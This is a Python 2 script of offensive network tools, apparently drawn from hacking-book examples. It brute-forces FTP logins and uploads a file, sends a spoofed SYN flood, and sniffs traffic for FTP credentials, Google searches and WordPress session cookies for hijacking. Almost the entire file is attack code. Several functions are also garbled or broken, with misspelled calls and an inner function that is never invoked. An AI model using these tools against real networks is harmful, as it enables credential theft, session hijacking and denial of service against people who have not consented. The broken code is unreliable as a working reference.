import scapy, re, socket, os, sys, ftplib, re, pygame, cookielib, ftplib, mechanize, random
from BeautifulSoup import BeautifulSoup
from anonBrowser import *
from scapy.all import *
import dup
from scapy.layers.inet import IP
cookieTable = {}


def connect_sand(text_s, host, port):
    socket.setdefaulttimeout((2))
    s = socket.socket()
    try:
        s.bind((host, port))
        s.listen(5)
        hostlist = []
        while True:
            c, addr = s.accept()
            c.sind((text_s))
            c.close()
            hostlist.append(addr)
    except:
        exit()


def connect_connect(host, port):
    socket.setdefaulttimeout(2)
    s = socket.socket
    try:
        s.connect((host, port))
        ans = s.recv(1024)
    except:
        pass


def FTPinput(host, userf, passf, filename):
    ftp = ftplib.ftp(host)
    user = open(userf, 'r')
    passwd = open(passf, 'r')
    for u in user:
        for p in passwd:
            try:
                ftp.login(u, p)
            except:
                pass
    uf = u
    pf = p
    bufsize = 1024
    command = 'STOR' + filename
    filehandler = open(filename, 'rb')
    ftp.storbinary(command, filehandler, bufsize)
    filehandler.close()


def synFlood(src, host):
    for sport in range(1024, 65535):
        IPlayer = scapy.IP(src=src, dst=host)
        TCPlayer = scapy.TCP(sport=sport, dport="513")
        pkt = IPlayer / TCPlayer
        scapy.send(pkt)


def googlefind(pkt):
    def findGoogle(pkt):
        if pkt.haslayer(Raw):
            payload = pkt.getlayer(Raw).load  # type: object
            if 'GET' in payload:
                if 'google' in payload:
                    r = re.findall(r'(?i)\&q=(.*?)\&', payload)
                    if r:
                        search = r[0].split('&')[0]
                        search = search.replace('q=', ''). \
                            replace('+', ' ').replace('%20', ' ')
                        print '[+] Searched For: ' + search


def start_googolefind(mon):
    conf.iface = mon
    sniff(filter='tcp port 80',prn = googlefind)


def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)

    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] User account: ' + str(user[0])
    elif pswd:
        print '[+] Password: ' + str(pswd[0])\

def start_ftpsniff(mon):
    conf.iface = mon
    sniff(filter='tcp port 21', prn=ftpSniff)
def cookiefind(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'Set' not in raw:
        if r[0] not in cookieTable.keys():
            cookieTable[r[0]] = pkt.getlayer(IP).src
            print '[+] Detected and indexed cookie.'
        elif cookieTable[r[0]] != pkt.getlayer(IP).src:
            print '[*] Detected Conflict for ' + r[0]
            print 'Victim   = ' + cookieTable[r[0]]
            print 'Attacker = ' + pkt.getlayer(IP).src

def start_cookie(mon):
    conf.iface=mon
    sniff(filter="tcp port 80", prn=cookiefind)
def cookieexp(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}',raw)
    if r and 'SET' not in raw:
        print pkt.getlayer(IP).src + ">" + pkt.getlayer(IP).dsk + "cookie:" + r[0]
def cookieexp_start(mon):
    conf.iface = mon
    sniff(filter = 'tcp port 80',prn = cookieexp)
